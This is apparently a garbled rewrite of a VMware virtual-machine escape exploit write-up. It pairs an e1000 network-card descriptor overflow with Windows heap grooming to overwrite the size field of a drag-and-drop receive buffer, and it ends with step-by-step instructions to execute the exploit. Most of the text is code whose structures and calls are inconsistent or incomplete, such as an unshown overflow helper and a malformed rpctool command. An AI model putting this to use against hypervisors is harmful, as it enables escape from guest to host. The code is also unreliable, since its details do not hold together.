### TCP Checksum and Transfer Structure

```c
typedef struct {
    uint32_t cmd_and_length;  // Command and length
    uint8_t status;           // Status
    uint8_t hdr_len;          // Header length
    uint16_t mss;             // Maximum segment size
    uint8_t ipcss;            // IP checksum
} prop_desc;

// The `ipcss` field is only one byte.
// How far can we overwrite?
```

### Function: `e1000_init_packet`

```c
void __usercall e1000_init_packet(...) {
    ...
    cur_buffer = packet;
    transfer_pay_size = pay_size;
    while (idx) {
        cmd = 0x1f | (1 << hdr_len);
        desc->mss = 0x10;
        desc->ipcss = offset - 0xa - 0x4 - ((desc->hdr_len + desc->mss + 0x11) & 0xfffffff8);
        // Create a second packet to send an IPv6 GSO packet
        data = (struct data_desc *)&packet[2];
        data->len = 0x800 | (1 << hdr_len);
    }
}
```

### Example Usage

#### Before We Start

```bash
f1yyy@ubuntu:~/vmware-rpctool “dnd.transport”
```

#### DnDTransferPacketHeader Structure

```c
typedef struct {
    uint32_t type;         // Type
    uint32_t seqNum;       // Sequence number
    uint32_t totalSize;    // Total size
    uint32_t payloadSize;  // Payload size
    uint32_t offset;       // Offset
    char data[1];          // Data
} DnDTransferPacketHeader;
```

#### mRecvBuffer Structure

```c
typedef struct {
    uint64_t seqNum;      // Sequence number
    void *buffer;         // Buffer
    uint64_t totalSize;   // Total size
    uint64_t offset;      // Offset
    // Other fields...
} DnDTransportBuffer;
```

### Example Initialization

```c
DnDTransferPacketHeader header = {
    .type = 3,
    .seqNum = 0,
    .totalSize = 0xa8,
    .payloadSize = 0x10,
    .offset = 0,
    .data = {0}
};

DnDTransportBuffer mRecvBuf = {
    .seqNum = 0,
    .buffer = malloc(0xa8),
    .totalSize = 0xa8,
    .offset = 0x10,
    // Other fields...
};
```

### Transfer Data

- **First Transfer:**
  ```c
  header.offset = 0;
  mRecvBuf.buffer = malloc(0xa8);
  mRecvBuf.totalSize = 0xa8;
  mRecvBuf.offset = 0x10;
  ```

- **Second Transfer:**
  ```c
  header.offset = 0x10;
  mRecvBuf.buffer = malloc(0xa8);
  mRecvBuf.totalSize = 0xa8;
  mRecvBuf.offset = 0x20;
  ```

### Exploit

- **Windows Low Fragmented Heap:**
  - A chunk of size `0xa8` will be allocated in the same bucket and in a contiguous address space.

- **Allocate DnD Structure:**
  - `tools.capability.dnd_version 3`
  - `vmx.capability.dnd_version`

- **Initialize mRecvBuffer:**
  ```c
  DnDTransportBuffer mRecvBuf = {
      .seqNum = 0,
      .buffer = malloc(0xa0),
      .totalSize = 0xa0,
      .offset = 0,
      // Other fields...
  };
  ```

- **Overwrite the `totalSize` of `mRecvBuf`:**
  - Call `e1000_overflow_write_size_0xa0(0x130)` to attempt to overwrite the `totalSize` field.

### Memory Layout

- **Free Blocks:**
  - Multiple free blocks are present, which can be used to manipulate memory.

- **DnD v3:**
  - The DnD version 3 structure is allocated and used for the exploit.

- **DnD Buffer:**
  - The buffer is allocated and initialized with specific sizes and offsets to facilitate the exploit.

By following these steps, you can set up and execute the exploit to manipulate the `totalSize` field of the `mRecvBuf` structure.